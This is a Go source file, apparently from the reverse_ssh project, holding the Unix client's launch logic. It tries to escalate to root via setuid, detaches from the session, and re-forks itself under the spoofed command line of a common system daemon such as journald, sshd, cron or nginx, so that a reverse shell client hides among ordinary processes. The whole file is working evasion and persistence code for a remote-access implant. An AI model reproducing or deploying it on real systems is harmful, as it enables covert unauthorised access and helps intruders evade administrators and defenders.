//go:build !windows

package main

import (
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
	"github.com/shirou/gopsutil/process"
)

func Run(destination, fingerprint, proxyaddress string) {
	//Try to elavate to root (in case we are a root:root setuid/gid binary)
	syscall.Setuid(0)
	syscall.Setgid(0)

	//Create our own process group, and ignore any  hang up signals
	syscall.Setsid()
	signal.Ignore(syscall.SIGHUP)

	client.Run(destination, fingerprint, proxyaddress)
}

//Gets a process that I deem to be 'boring', i.e it exists on many systems and does a critical function that is often ignored
func GetBenignProcess() []string {
	staticBoring := [][]string{
		{"/lib/systemd/systemd-journald"},
		{"/lib/systemd/systemd-localed"},
		{"/lib/systemd/systemd-networkd"},
		{"/lib/systemd/systemd-resolved"},
		{"ssh-agent"},
		{"/usr/bin/dbus-daemon", "--system", "--address=systemd:", "--nofork", "--nopidfile", "--systemd-activation", "--syslog-only"},
		{"/usr/sbin/nsd", "-d"},
		{"/usr/sbin/cron", "-f"},
		{"/usr/sbin/ModemManager", "--filter-policy=strict"},
		{"/usr/lib/policykit-1/polkitd", "--no-debug"},
		{"/usr/sbin/sshd", "-D"},
		{"/sbin/dhclient"},
		{"/usr/sbin/NetworkManager", "--no-daemon"},
		{"/usr/sbin/rsyslogd", "-n"},
		{"/sbin/agetty", "-o", "-p", "--", "\\u", "--noclear", "tty1", "linux"},
		{"/sbin/rpcbind", "-w"},
	}

	processes, err := process.Processes()
	if err != nil {
		return staticBoring[rand.Intn(len(staticBoring))]
	}

	potentials := [][]string{}

	for _, p := range processes {
		pr, err := p.CmdlineSlice()
		if err == nil && len(pr) != 0 && isBoring(pr[0]) {
			potentials = append(potentials, pr)
		}
	}

	if len(potentials) == 0 {
		return staticBoring[rand.Intn(len(staticBoring))]
	}

	return potentials[rand.Intn(len(potentials))]
}

func isBoring(s string) bool {
	boringFragments := []string{
		"httpd",
		"apache",
		"nginx",
		"dhcpcd",
		"/lib/systemd/systemd-",
		"cron",
		"dbus-daemon",
		"getty",
		"rsyslogd",
		"ntp",
		"wpa_supplicant",
		"NetworkManager",
		"docker",
		"vnc",
		"php-fpm",
		"redis-server",
		"postgres",
		"mysql",
		"mariadb",
		"php",
		"fcgi",
		"proftpd",
		"dhclient",
		"mongod",
		"dovecot",
	}

	for i := range boringFragments {
		if strings.Contains(s, boringFragments[i]) {
			return true
		}
	}

	return false

}

func Fork(destination, fingerprint, proxyaddress string) error {
	log.Println("Forking")

	err := fork("/proc/self/exe")
	if err != nil {
		log.Println("Forking from /proc/self/exe failed: ", err)

		binary, err := os.Executable()
		if err == nil {
			err = fork(binary)
		}

		log.Println("Forking from argv[0] failed: ", err)
		return err
	}
	return nil
}

func fork(path string) error {
	boringProcessArgv := GetBenignProcess()

	log.Println("Selected: ", boringProcessArgv)

	r, w, err := os.Pipe()
	if err != nil {
		return err
	}

	//Write original argv via fd 3, so we can more effectively change the client argv to be something innocuous
	w.Write([]byte(strings.Join(os.Args, " ")))
	w.Close()

	cmd := exec.Command(path)
	cmd.Args = boringProcessArgv
	cmd.ExtraFiles = append(cmd.ExtraFiles, r)

	err = cmd.Start()

	if cmd.Process != nil {
		cmd.Process.Release()
	}
	return err
}
